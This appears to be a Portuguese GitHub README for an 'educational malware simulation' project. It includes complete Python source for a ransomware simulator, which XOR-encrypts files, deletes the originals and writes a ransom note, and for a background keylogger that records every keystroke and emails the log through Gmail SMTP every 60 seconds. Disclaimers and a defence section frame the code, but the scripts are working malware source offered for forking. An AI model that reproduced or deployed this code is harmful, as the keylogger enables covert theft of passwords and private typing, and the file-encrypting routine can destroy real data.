# Simulação de Malware em Ambiente Seguro

Este repositório contém uma implementação prática e educacional de simulações de malware usando Python. O objetivo é entender o comportamento de ameaças cibernéticas em um ambiente controlado e seguro, sem causar danos reais. Tudo aqui é para fins de aprendizado, demonstrando conceitos de cibersegurança.

**Aviso:** Execute esses scripts apenas em pastas de teste isoladas (ex: máquina virtual com VirtualBox ou VMWare). Não aplique em sistemas reais. Malware real é ilegal e antiético. Este projeto segue diretrizes éticas e foca em educação.

## Estrutura do Repositório
- `ransomware_simulado.py`: Script para simular ransomware (criptografia/descriptografia de arquivos de teste e nota de resgate).
- `keylogger_simulado.py`: Script para simular keylogger (captura de teclas, armazenamento em arquivo e envio por e-mail automático).
- `test_files/`: Pasta com arquivos de teste (ex: file0.txt, file1.txt) para o ransomware.
- `README.md`: Este arquivo com documentação, explicações e reflexões.

## Requisitos
- Python 3.x.
- Para o keylogger: Instale a biblioteca `pynput` via pip: `pip install pynput`.
- Bibliotecas padrão: `os`, `threading`, `smtplib`, `email` (já inclusas no Python).
- Ambiente seguro: Use uma pasta dedicada ou VM para testes.

## Ransomware Simulado
### Descrição
Este script cria arquivos de teste, criptografa-os usando um algoritmo simples (XOR com uma chave fixa), gera uma nota de resgate e permite descriptografar. É uma simulação básica para entender como ransomwares operam, mas sem persistência ou propagação real.

### Como Executar
1. Crie uma pasta `test_files` e adicione arquivos .txt simples (ex: "Olá, este é um teste.").
2. Rode o script: `python ransomware_simulado.py`.
3. Ele criptografará os arquivos, criará `RANSOM_NOTE.txt` e salvará a chave em `secret.key`.
4. Para descriptografar, comente/descomente as seções no script ou rode manualmente a função de descriptografia.

### Explicação do Código
- **Criação de Arquivos de Teste:** Gera 3 arquivos .txt na pasta `test_files`.
- **Criptografia:** Usa XOR (operador ^) para "encriptar" bytes dos arquivos. Adiciona extensão `.encrypted` e remove o original (simulando perda de acesso).
- **Descriptografia:** O mesmo XOR reverte o processo (simétrico).
- **Nota de Resgate:** Cria um arquivo de texto com uma mensagem fictícia.
- **Segurança:** A chave é fixa (42) para simplicidade, mas em cenários reais, use chaves aleatórias e seguras.

**Exemplo de Saída:**
- Arquivos originais: `file0.txt`, `file1.txt`.
- Após criptografia: `file0.txt.encrypted`, `RANSOM_NOTE.txt` com "Seus arquivos foram criptografados! Pague para recuperar.".

## Keylogger Simulado
### Descrição
Este script captura teclas pressionadas, armazena em um arquivo .txt, torna-o "furtivo" rodando em background (sem janela visível) e envia o log por e-mail a cada 60 segundos. É uma simulação para entender keyloggers, mas sem instalação persistente ou ocultação avançada.

### Como Executar
1. Instale `pynput`: `pip install pynput`.
2. Configure credenciais de e-mail no script (use contas de teste, como Gmail com app password – NÃO use contas reais!).
3. Rode o script: `python keylogger_simulado.py` (ou `pythonw keylogger_simulado.py` no Windows para rodar sem console).
4. Pressione teclas para testar. O log vai para `keylog.txt`.
5. Pare com Ctrl+C (no terminal) ou feche o processo.

### Explicação do Código
- **Captura de Teclas:** Usa `pynput.keyboard` para escutar eventos de teclado.
- **Armazenamento:** Adiciona teclas ao log e salva em `keylog.txt`.
- **Furtividade:** Usa `threading` para rodar em background e timer para envio periódico.
- **Envio por E-mail:** Usa `smtplib` para enviar o log via SMTP (ex: Gmail). Limpe o log após envio.
- **Limitações:** Não é invisível em gerenciadores de tarefas. Para simulação apenas.

**Aviso:** Use e-mails de teste (ex: crie contas descartáveis). Não capture dados reais sem consentimento.

## Reflexão sobre Defesa
Ao simular esses malwares, aprendi a importância da prevenção. Aqui vão medidas de defesa documentadas:

### Medidas de Prevenção e Defesa
1. **Antivírus e Anti-Malware:** Use ferramentas como Windows Defender, Avast ou Malwarebytes. Elas detectam padrões de comportamento (ex: criptografia em massa para ransomware) e assinaturas de keyloggers. Atualize regularmente.
   
2. **Firewall:** Ative firewalls (ex: Windows Firewall ou pfSense) para bloquear comunicações suspeitas, como envios de e-mail de keyloggers ou conexões C2 de malwares.

3. **Sandboxing:** Execute aplicativos suspeitos em ambientes isolados, como Sandboxie ou VMs. Isso contém o malware, prevenindo danos ao sistema host. Ferramentas como Cuckoo Sandbox analisam malwares em sandboxes automatizadas.

4. **Conscientização do Usuário:** Eduque sobre phishing, downloads suspeitos e atualizações. Use senhas fortes, autenticação 2FA e evite macros em documentos. Treinamentos como os da NIST ajudam a reconhecer ameaças.

Outras dicas:
- Backups regulares (3-2-1 rule: 3 cópias, 2 mídias, 1 offsite) para ransomware.
- Monitore processos (Task Manager) para keyloggers.
- Use VPNs e criptografia de disco (BitLocker) para proteção extra.

### Aprendizados e Reflexões
- **Entendimento Técnico:** Implementar esses scripts mostrou como malwares exploram APIs simples do Python (ex: listeners de teclado, manipulação de arquivos). XOR é básico, mas ilustra criptografia simétrica; em malwares reais, usam AES ou RSA.
- **Ética e Responsabilidade:** Simulações ajudam a defender, não atacar. Aprendi que cibersegurança é sobre equilíbrio: conhecer o inimigo para proteger.
- **Adaptações e Melhorias:** Poderia adicionar persistência (ex: agendamento de tarefas), mas evitei para manter seguro. Novos cenários: simular worm propagando via rede local.
- **Jornada de Aprendizado:** Pesquisei documentações de bibliotecas e relatórios de cibersegurança (ex: MITRE ATT&CK). Isso reforçou que educação é a melhor defesa. Recomendo estudar OSCP ou livros como "Hacking: The Art of Exploitation".

## Contribuições
Sinta-se à vontade para fork e melhorar! Compartilhe suas reflexões.

Licença: MIT (use livremente para educação).

Script: ransomware_simulado.py

import os

# Chave fixa para XOR (simples para simulação; em cenários reais, gere aleatória)
XOR_KEY = 42

def xor_encrypt_decrypt(data, key):
    """Função simétrica para criptografar/descriptografar com XOR."""
    return bytes(b ^ key for b in data)

def encrypt_file(file_path, key):
    """Criptografa o arquivo e remove o original."""
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted = xor_encrypt_decrypt(data, key)
    encrypted_path = file_path + '.encrypted'
    with open(encrypted_path, 'wb') as f:
        f.write(encrypted)
    os.remove(file_path)
    print(f'Arquivo criptografado: {encrypted_path}')

def decrypt_file(encrypted_path, key):
    """Descriptografa o arquivo e remove a versão criptografada."""
    with open(encrypted_path, 'rb') as f:
        data = f.read()
    decrypted = xor_encrypt_decrypt(data, key)
    original_path = encrypted_path.replace('.encrypted', '')
    with open(original_path, 'wb') as f:
        f.write(decrypted)
    os.remove(encrypted_path)
    print(f'Arquivo descriptografado: {original_path}')

def create_test_files(test_dir):
    """Cria arquivos de teste."""
    os.makedirs(test_dir, exist_ok=True)
    for i in range(3):
        file_path = os.path.join(test_dir, f'file{i}.txt')
        with open(file_path, 'w') as f:
            f.write(f'Este é o arquivo de teste {i}. Conteúdo confidencial.')
        print(f'Arquivo criado: {file_path}')

def create_ransom_note(test_dir):
    """Gera nota de resgate."""
    note_path = os.path.join(test_dir, 'RANSOM_NOTE.txt')
    with open(note_path, 'w') as f:
        f.write('Seus arquivos foram criptografados! Pague 1 BTC para a chave de descriptografia.\nContato: hacker@ficticio.com')
    print(f'Nota de resgate criada: {note_path}')

# Execução principal (simulação)
if __name__ == '__main__':
    test_dir = 'test_files'
    
    # Passo 1: Criar arquivos de teste
    create_test_files(test_dir)
    
    # Passo 2: Criptografar arquivos
    for file in os.listdir(test_dir):
        if file.endswith('.txt') and not file.startswith('RANSOM_'):
            encrypt_file(os.path.join(test_dir, file), XOR_KEY)
    
    # Passo 3: Criar nota de resgate
    create_ransom_note(test_dir)
    
    # Passo 4: Descriptografar (comente se não quiser rodar imediatamente)
    # for file in os.listdir(test_dir):
    #     if file.endswith('.encrypted'):
    #         decrypt_file(os.path.join(test_dir, file), XOR_KEY)

Script: keylogger_simulado.py

import threading
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard  # Requer pip install pynput

log = ""
log_file = 'keylog.txt'

def on_press(key):
    """Captura teclas pressionadas."""
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        else:
            log += f'[{key.name}]'

    # Salva no arquivo a cada tecla (para simulação)
    with open(log_file, 'a') as f:
        f.write(log[-1])  # Escreve o último caractere

def send_email():
    """Envia o log por e-mail e limpa."""
    global log
    if log:
        # Configurações de e-mail (USE CONTAS DE TESTE!)
        sender = 'seuemail@teste.com'
        receiver = 'destino@teste.com'
        password = 'sua_senha_app'  # Use app password para Gmail
        smtp_server = 'smtp.gmail.com'
        port = 587

        msg = MIMEText(log)
        msg['Subject'] = 'Log de Teclas Simulado'
        msg['From'] = sender
        msg['To'] = receiver

        try:
            with smtplib.SMTP(smtp_server, port) as server:
                server.starttls()
                server.login(sender, password)
                server.send_message(msg)
            print('E-mail enviado (simulado).')
        except Exception as e:
            print(f'Erro ao enviar e-mail: {e}')

        log = ""  # Limpa o log após envio

    # Timer para próximo envio (60 segundos)
    threading.Timer(60, send_email).start()

def start_keylogger():
    """Inicia o listener em background."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    send_email()  # Inicia o timer

if __name__ == '__main__':
    print('Keylogger simulado iniciado. Pressione teclas para testar. Pare com Ctrl+C.')
    start_keylogger()
    # Mantém o script rodando
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print('Keylogger parado.')

--

Arquivos Adicionais

Crie a pasta test_files manualmente e adicione .txt como no script.
Para testar, rode os scripts em uma VM ou pasta isolada.
